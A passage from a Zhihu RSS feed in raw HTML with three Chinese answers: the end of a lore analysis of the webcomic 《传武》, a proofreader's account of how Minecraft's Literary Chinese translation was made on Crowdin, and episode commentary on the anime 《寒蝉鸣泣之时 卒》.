data-original-src=\"v2-322c97df2a3c79fc363b1b2724b21bc4\" data-watermark-src=\"v2-c6e9664c213853a8b9510a8af027f187\" data-private-watermark-src=\"\"></p>\n<p>不过狗血的是，根据星云老师来说，世界上的百兵演武虽然人人可以上手学习，但所用的库是固定的，这就导致理论上，两个强者不可能同时使用百兵演武；不过反过来两个百兵演武的使用者在争抢百兵演武的使用权倒也是十分有意思的设定（不知道这个设定现在还在不在）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-577fc3d168534e0e75f64a8292ea6aea_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"817\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-577fc3d168534e0e75f64a8292ea6aea\" data-watermark-src=\"v2-15ccc498348215229dfdeae5d63a005c\" data-private-watermark-src=\"\"></p>\n<p><b>3.六道轮回间的相生相克</b></p>\n<p>在传武的世界有六道：这六道就是传武世界运行的底层逻辑：生死掌道者目前官方公认最强，酆都也是此方唯一没有继承人的红尘仙；奇技掌道者 最早应该是此方的观音，之后是汉代作用（千年宗门嘛）建立上清派的李董，现在的继任者好像是李春；祸殃掌道者目前应该是那个叫花子，传说一切天灾都是起源于他，是追求乱世的道，目前只知道宁仲身上的祸根是他的手笔；鬼神掌道者目前未知  曾协助构建了大唐的山神土地体系和大晋的城隍体系，按照传说应该建立有宗门；王朝掌道者目前未知，应该在大唐建立有宗门，据说他的衍生规则是玉玺，是祸殃道的死对头，喜欢构建统一和平的王朝；万物掌道者 最早应该是和观音一起活动的驺虞后来唐代时期是可以使用特殊水镜的犭婴如三公主，现任是雁门关外的猰貐；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-81cdc5ef98ee62eab1437b72fb0d6446_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"854\" data-rawheight=\"646\" data-watermark=\"watermark\" data-original-src=\"v2-81cdc5ef98ee62eab1437b72fb0d6446\" data-watermark-src=\"v2-3d179beb6800386321d8274708e64fab\" data-private-watermark-src=\"\"></p>\n<p>这六道互相干涉，互相制约，相生相克构建了此方的《传武》世界；《传武》的世界确实是非常缤纷绚烂的，可能开始有一点生涩，但是当你接受了这些基本设定就能够很好的享受这里面的乐趣；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1e65e30c08ed4b7ab95004611c70e227_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-1e65e30c08ed4b7ab95004611c70e227\" data-watermark-src=\"v2-169ae2151285dd842d8bfa5760bc0ca6\" data-private-watermark-src=\"\"></p>\n<p>另外，除了此方世界外，上界的神明其实也是以六位圣人为首的；不知道是否对应大千世界的六道；</p>\n<hr>\n<h2><b>个人感想</b></h2>\n<p>说点自己的想法：传武其实诞生在一个比较特殊的时期，网络漫画慢慢开始正规化，但是读者还没有完全适应网络漫画的阅读习惯；这应该也是早期《传武》剧情节奏问题的原因之一，不过反过来说，很幸运，看到《传武》一直连载到现在；不论从画风上的不断进化还是故事上的不断丰富，都可以看成这一个特殊历史时期的缩影，传武见证了网络漫画进入一个更好的时代；（下图为传武早期海报）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3a6a3afd84ebc745509f746f6ec880c4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1195\" data-watermark=\"watermark\" data-original-src=\"v2-3a6a3afd84ebc745509f746f6ec880c4\" data-watermark-src=\"v2-3403f26c2f74711a0d19196b0cde9884\" data-private-watermark-src=\"v2-91d4f3fec6ed63e36141d65f7d99aeac\"></p>\n<p>《传武》正和他故事中的角色一样，是一部不断在成长的漫画；叙事上现在的《传武》不仅敢玩梦中梦这样复杂的套路，还非常善于把不同的场景穿插着推进；作画上《传武》的进步更是有目共睹的；希望《传武》未来也能想如今这样不断的进化成长，也希望这么一部优秀的漫画能被更多人看到；（下图为传武第二部海报）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2f87b8bce90dbe1af9f7df75dde38f55_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1745\" data-watermark=\"watermark\" data-original-src=\"v2-2f87b8bce90dbe1af9f7df75dde38f55\" data-watermark-src=\"v2-98bde04621e3c746852bcac3e0ed3b51\" data-private-watermark-src=\"v2-c261ffb13200bdc31cdaf225b90ae3b7\"></p>\n<p><br></p>\n<a href=\"https://zhuanlan.zhihu.com/p/386792682\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-4a266d6d79ceb8f3e1eac1b9e445fd0a_bh.jpg\" data-image-width=\"1118\" data-image-height=\"563\" class=\"internal\">呆呆兽星君：《传武》红尘仙</a><p>感谢您的阅读~<br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/397486086/answer/1982744764?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">21 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/384869484?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么评价漫画《传武》？</a><br><a href=\"http://www.zhihu.com/question/348999269?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">日式  ACG 作品有哪些常见百试不爽的套路？</a><br>\n","link":"http://www.zhihu.com/question/397486086/answer/1982744764?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何看待游戏《我的世界》（Minecraft）1.17.1 pre2 版本加入了文言文？","date":"2021-07-06 03:00:12","description":"\n<p>大家好，我是Minecraft文言语言的校对员ff98sha。</p>\n<p>前些天Minecraft文言语言上线了，借此机会写个回答和大家说说，Minecraft的翻译到底是个什么流程。关于文言翻译的来龙去脉可以先看看<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/read/cv11957511%3Ffrom%3Dsearch\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">项目创始人的话</a>。</p>\n<h2>语言的增减</h2>\n<p>在Minecraft Java版1.1时代，游戏还只有36种<a href=\"http://link.zhihu.com/?target=https%3A//minecraft.fandom.com/zh/wiki/%25E8%25AF%25AD%25E8%25A8%2580\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">语言</a>，到了1.17.1便增长到了111种。近几年的语言申请是在<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft/discussions/1386\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Crowdin上的一个话题/表格</a>中申请的。可以在这上百层楼中看到有许多语言正等候加入游戏。Cuervo在2020年向Mojang提交了<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft/discussions/1612\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">文言申请</a>，并在2021年初被通过。因此文言并不特殊，至少和克林贡语比起来（</p>\n<p>语言申请通过之后，Mojang会在这两个项目中开放该语言的翻译。当语言的翻译和审核进度达到一定百分比时，Mojang就会在定期的排查中将此语言加入到游戏中。例如，文言在正式加入游戏时，校对进度为56%。</p>\n<p>因此新语言要正式加入游戏，除了审批外，至少需要翻译和审核2000多个词条（约8000多个单词）。在Crowdin上Mojang开放了140个语言的翻译，但在1.17.1中仅有111个语言。剩下的那些语言中除了尚未上线过的，还有因为长期无人维护（而字符串又在不断增加）导致翻译进度很低，而从游戏中移除的（如这次移除的马恩岛语）。</p>\n<p><b>所以，各位看到的文言语言其实是尚未完工的。</b>在上线之前我们也没有得到任何的通知。于是乎，大家就会各种吐槽某些翻译有问题……</p>\n<p>自从看到b站的某介绍MC文言视频热度飙升，我们就紧急联系了许多up主，他们也在视频里介绍了“文言语言由玩家翻译，尚未完工，轻喷”的事。不过大多数人还是以为这是Mojang官方整的烂活（</p>\n<p><img src=\"https://pic2.zhimg.com/v2-660a1678869f20a12e08662e87647ddf_720w.jpg?rss\" data-caption=\"然未校者十之有四，請恕其拙。\" data-size=\"normal\" data-rawwidth=\"559\" data-rawheight=\"427\" data-watermark=\"watermark\" data-original-src=\"v2-660a1678869f20a12e08662e87647ddf\" data-watermark-src=\"v2-304f578c38ec5da9809e0a3a7f6e68ee\" data-private-watermark-src=\"\"></p>\n<h2>翻译流程</h2>\n<p><b>Minecraft Java版的翻译全由社区完成</b>，其他版本由专门团队完成，在此不做讨论。</p>\n<p>Minecraft所在的翻译平台叫做<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Crowdin</a>（<a href=\"http://link.zhihu.com/?target=https%3A//zh.crowdin.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中文版</a>），Mojang开设了<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Minecraft</a>本体和<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft-launcher\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Minecraft Launcher</a>两个项目。</p>\n<p>任何人都可以注册一个Crowdin账号，然后申请加入Minecraft项目。申请通过后就可以选择某个语言开始翻译了。</p>\n<p>普通用户的身份是译者，可以翻译词条，也可以对其他用户提交的翻译进行赞和踩。</p>\n<p>翻译后校对员会对译文进行校对。校对员是由Mojang钦定的、有能力管理语言的译者。目前简体中文的校对员是Cuervo和Powup333，文言的校对员是Cuervo和ff98sha。</p>\n<p>对于有大问题/已经核对的翻译，可以在右侧评论区提出一个问题（issue），并自动提醒校对员重新审查。</p>\n<p>有时候可能会看到有两个完全一样的翻译存在，这是因为校对员使用了全局替换功能，替换了所有翻译中的某个字符串。</p>\n<h2>翻译实装</h2>\n<p>在每两个快照发布前，Mojang会将Crowdin平台上的翻译下载后打包进游戏中。在这个过程中，会自动选择已翻译已校对的翻译。<b>对于已翻译未校对的翻译，则会自动选择Crowdin上排序靠前的翻译。翻译会按照得票数多少从高到低排，平票的按照时间顺序，新提交的会排在前面。</b></p>\n<p><b>于是，就导致了并未校对的译名加入游戏。</b>大家看到的半成品文言就充满了译名不统一、质量差、简繁混用、字形不统一等校对过程中需要解决的问题。当年的雷石东也是因为这个原因而出现的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6f5c712ffdac22057c3adca5ff806005_720w.jpg?rss\" data-caption=\"我知道你们在找什么\" data-size=\"normal\" data-rawwidth=\"518\" data-rawheight=\"596\" data-watermark=\"watermark\" data-original-src=\"v2-6f5c712ffdac22057c3adca5ff806005\" data-watermark-src=\"v2-4c7e009210e25bac3351bf69d647b5a8\" data-private-watermark-src=\"\"></p>\n<p>大家会注意到，有时在启动已下载过的版本之前，依旧会从Mojang服务器重新下载游戏资源文件。这大多是翻译文件的更新。一般来说，Mojang会维护最新两个大版本的翻译。这也是为什么你在1.16.5也能看到文言选项。</p>\n<h2>关于翻译组</h2>\n<p><i>独家爆料：文言翻译组内竟没有一个古人！</i></p>\n<p>Minecraft文言的翻译组是2020年2月建立的，直到2021年1月21号文言上线Crowdin，翻译进度还是很惨淡。</p>\n<p>我赶在寒假和几次节假日/周末，在群内组织了多次讨论，确定了一部分词汇的译法，但想赶在1.17发布前完成校对的愿望还是过于美好。直到4月底，翻译进度为98%，校对进度仅为14%。五一假期及之后猛肝了一波，最终在5月中旬，校对进度突破了58%。</p>\n<p>有人推荐我们参考《汉典》等专业书。没错，我们都用到了，纸质和线上的资源。很少有应用或游戏会有文言翻译，所以我们的基本无从借鉴。但我能确定，游戏中已校对的翻译，几乎都能在讨论群里找到几十条关于其的讨论，这些翻译大都是我们尽力考证过争辩后得出的。</p>\n<p><b>我们是普通玩家，但我们真的有用心整活。</b></p>\n<p>如果有古汉语专业的玩家，请速联系我们，不胜荣幸。</p>\n<h2>其他</h2>\n<p>中文Minecraft Wiki积极参与了Minecraft简体中文版本的翻译。其中主要参与者Craft Lawrence、Powup333和Sjjklh有幸被官方赠予印有中国国旗的特殊翻译者披风。同时这三名成员也获得了简体中文版本的校对员资格，并维护简体中文版本的翻译至2018年。</p>\n<p>文言语言使用繁体是为了承古风。</p>\n<p>文言在语言列表的中间是因为其ISO 639-3代码为lzh（Literary Chinese）。</p>\n<p>2021年7月6日发布了1.17.1正式版，我们这周修改了大量问题，新的翻译会实装到此版本，欢迎体验。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-28630ad281f5956da3d632a5e6ee01da_720w.png?rss\" data-caption=\"蜜脾块，确信\" data-size=\"normal\" data-rawwidth=\"340\" data-rawheight=\"166\" data-watermark=\"watermark\" data-original-src=\"v2-28630ad281f5956da3d632a5e6ee01da\" data-watermark-src=\"v2-407ec565a6a0ff6f0dab9e5aa6e5a757\" data-private-watermark-src=\"v2-5a520f5c85cef1b9e53be6fbf7006c05\"></p>\n<p>最近一周一直在努力校对词条，并收集玩家的反馈建议。感谢各位玩家的支持与指正，我们会继续整个文化自信的好活。</p>\n<p>对于文言翻译的建议以及加入翻译组的申请，可以评论本回答或私聊我。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ff98sha?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">ff98sha</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469226186/answer/1979682825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">58 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/26584294?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">微软会不会把 Minecraft 换引擎重制一遍？</a><br><a href=\"http://www.zhihu.com/question/406965213?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">朋友开了我的世界中国版本地联机房并加了些mod，我收到存档后，导入单人显示forge mod什么的?</a><br>\n","link":"http://www.zhihu.com/question/469226186/answer/1979682825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021年7月开播的动画《寒蝉鸣泣之时 卒》？","date":"2021-07-05 11:30:09","description":"\n<p>终于等到《卒》了！继续分集评析，一周一更。</p>\n<p>关于《业》的分集解读请看这里：</p>\n<a href=\"https://www.zhihu.com/question/423143915/answer/1513310105\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-c9329c58a0897eeec4285a4ee7605796_bh.jpg\" data-image-width=\"2880\" data-image-height=\"1800\" class=\"internal\">如何评价2020年10月开播的动画《寒蝉鸣泣之时》？</a><p><br></p>\n<p>关于《卒》的一些基本认识：《卒》是解题篇，一共十五集，而第一篇的《鬼明篇》是《鬼骗篇》的解答，所以这样子来看前三篇都是对《业》中前三篇的解答，一定程度上也分别对应《解》中的前三篇。顺带一提，鬼明篇的前两话其实是一起放送的，只不过第一话在1号11：30半放送，第二话则是在2号零点开始。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-098eacb3f028b4f8b9c11bde5c0768d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"826\" data-rawheight=\"394\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>7.1 鬼明篇：其一</b></h2>\n<p>• 鬼明篇的开头与鬼骗篇一致，但从一些细节中可以看出，我们观剧的视角发生了翻转，于是本篇中我们是从作为黑幕的沙都子和礼奈的角度来看待整个故事的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-26bcf64e7034552b19e4d497fb0dde0c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在鬼骗篇同款opening sequence之后，追加了沙都子的独白</p>\n<p><br></p>\n<p>• 本篇很明显能看出《罪灭篇》的成分：礼奈的父亲遭遇间宫莉娜、礼奈开始回想过去的的不幸以及自己从礼奈变成蕾娜的契机，这些都是罪灭篇的基本配置。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c18235e6a24b16838266fa9f7737ecea_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-bc2f61eaf9c4c5ab14b41da730267719_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4db6ace9f6ab0999a10d13a3b57ae505_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 本作承袭《业》中的「镜像翻转」要素，在一些场景中以镜像作为暗示，譬如下图中的沙都子，在窗户中的倒影是轮回者状态。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9139a72234ba4392fabb407fd703504b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>注意眼睛</p>\n<p><br></p>\n<p>• 本集中明确了骗篇的凶手应该都是因为沙都子的注射而发病的，而结合铁平与下一集的莉娜，此处有一种可能，那就是在业力的影响下，各个碎片的凶手和发病者都会主动去回避曾经的错误，导致每个碎片在不被沙都子干涉的情况下都可以走向幸福的结局。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c6c7c163b68a3b42dd8b9e32cecfdb01_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>沙都子为礼奈施打药物</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e66175e98e2283cdb92d47054126f0ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>礼奈睡得真沉...</p>\n<p><br></p>\n<p>• 礼奈在药物的影响下进入了发病的状态，并且不由自主地回想起来过去与母亲之间不愉快的回忆。值得一提的是，旧作里礼奈的父母应该都是没露脸的，不过本次倒是都老老实实地画了出来；礼奈母亲怀孕的细节得到了强调，不知道是否是在为与《命》的联动作铺垫（《命》主角之一的凤谷菜央是礼奈同母异父的妹妹，就是此处腹中的胎儿）。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-18597a2b0e80475fa0c41c3afe6783b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-63f88057c539856b55de5204c306cb65_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>跟小学生说这种话，真的大丈夫？</p>\n<p><br></p>\n<p>• 礼奈发病后有大量自言自语的场景，这虽然显得有点解说性过强，但配合发病时的癫狂来看还挺带感的。不得不说，本作里对于lv5状态时的疯狂姿态描绘得非常好，观赏性要远大于旧作。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-26fac28c9f9bd2520381890a611c0857_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1c6d87f1e76cbb5ad7a66be55cbbd160_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-64dd7121ee7797f1a521b335cc4cc52a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这张礼奈好可爱啊</p>\n<p><br></p>\n<p>• 和铁平相似，这个碎片中的莉娜也开始良心发现，从一开始就没有作恶的动机。所以本篇本来可以走向一个幸福的结局（毕竟铁平和鹰野也不会搞事），但在沙都子的介入下被破坏了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d8d85ac1317e8086fbe437c4a170ba2d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-937215a84c1fe9206bf08da9dae4ae6a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这样的莉娜很少见，令我对原本纯黑的她产生了一丝怜悯</p>\n<h2>7.2 鬼明篇：其二</h2>\n<p>（因为这集还没中文资源，所以只能在Hulu上一边看一边用手机拍照了）</p>\n<p>• 礼奈开始进行谋杀的准备，恰好碰上莉娜自己找上门来。值得一提的是，似乎是为了映衬礼奈的这种癫狂状态，这个夕阳西下的场景里，配色也有一种妖异的感觉，让人想起了「さよならを教えて」。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c321cd23d70fc86963ca366ccfe1a839_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b46f6f2738d44d873e6ad4ec1e1cb2f2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 在礼奈的秘密据点内，莉娜想要对她敞开心扉，结果被发狂的礼奈袭击。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-af526b91b19f2f8dd39568ef24a97cfb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7b608ed7a23bb0a2edbb61d7f5cdba13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 不得不说，礼奈在本集的发狂场景作画非常不错，狂乱之余，不失魄力。值得一提的是，因为注射所导致的发病状态，似乎和自然发病是存在区别的，譬如这里的礼奈就比罪灭篇要更具有侵略性。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-218a4a0c805471ce119db135ce3bc1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bd17c04b14768e58db01b7533cb68a1b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b17a0efba457fe5d118de8b80644d5f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 沙都子就在案发现场的山坡上远远观望，此处的构图与《业》第一集时梨花俯瞰圭一的场景一模一样，再度强调了立场和视角的反转。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c105c778c1df125d3dd7127431ba487e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3da66c9dfc57c0fbea3f7e2b2addd5d5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 第二天，试图在垃圾山继续处理尸体的礼奈，碰上了追寻她而来的圭一，并开始疑神疑鬼。这个疑心状态下的礼奈，在其表情的描绘上，风格比较写实化，因而产生了一种奇妙的反差，个人非常喜欢。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9fb706752e6089cd73ea00023cccad8b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4ab20761a812eb0b858733971132acb5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>• 礼奈在回家的路上遇见了大石，得知警方在调查间宫莉娜的失踪，因而承受了更多的精神压力。不过，即使是在这样的状态下，她也没有让大石看出破绽，可见礼奈的自制能力和冷静程度都非常可怕。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-39239679db952d647229cab7b2c46303_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<h3>关于前两集的简评</h3>\n<p>• 相较于《业》来说，《卒》的前两集可以说是照常发挥，各方面延续了《业》的特点以外，也继承了「新内容+剧情复盘」的模式，可见制作方对《卒》仍旧抱有拉新观众入坑的期望。</p>\n<p>• 可能是为了与《业》对接，《卒》中有不少直接从《业》里照搬的段落和画面，不过也许是因为这一点节省了开支，所以在新场面的描绘上有了更好的发挥，譬如这两集中礼奈发病的场面。</p>\n<p>• 结合《乡坏篇》和《鬼明篇》来看，出题篇之所以命名为《业》，大概是因为每个角色都要为自己曾经的罪业付出代价，因而与为自己所拖累的人进行了位置的转换，从被害者变成了加害者，所以之后的绵明篇和祟明篇大概也是类似的走向。</p>\n<p>• 总觉得《卒》的画风好像变得更顺眼了，不知道是因为自己看习惯了，还是绘柄真的变了，总觉得之前的那种肥而圆的感觉好像没有那么明显了。</p>\n<h2>7.8 鬼明篇：其三</h2>\n<p>• 这集不论是节奏还是作画方面都像是个总集篇... 少量的新画面加上大量从业照搬过来的旧画面，算是把鬼骗篇后续的一部分给解答了，但是这些解释并不是非常令人满意。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-64023df551e60de323cbb11487cefa62_720w.jpg?rss\" data-caption=\"而且一部分新画面相当敷衍，甚至可以说是崩坏\" data-size=\"normal\" data-rawwidth=\"2880\" data-rawheight=\"1800\" data-watermark=\"watermark\" data-original-src=\"v2-64023df551e60de323cbb11487cefa62\" data-watermark-src=\"v2-21342095da46a7d35450a2cba9278f83\" data-private-watermark-src=\"v2-689421da7406883137268c1ac6b1d876\"></p>\n<p><br></p>\n<p>• 鬼骗篇最令人好奇的地方就在于礼奈刺杀圭一前后的一系列细节，但是这一部分在鬼明篇中占的篇幅非常至少，而且并没有什么令人震惊的真相 —— 礼奈的发疯是切实的，而且直到最后也没有从lv5状态中恢复（这似乎意味着注射导致的发病是无法解除的，因为礼奈有过数次从lv5状态自愈的案例），而圭一也并没出现幻觉，仅仅是在最后发病了而已。</p>\n<p>• 本集的经典表情合集：</p>\n<p><img 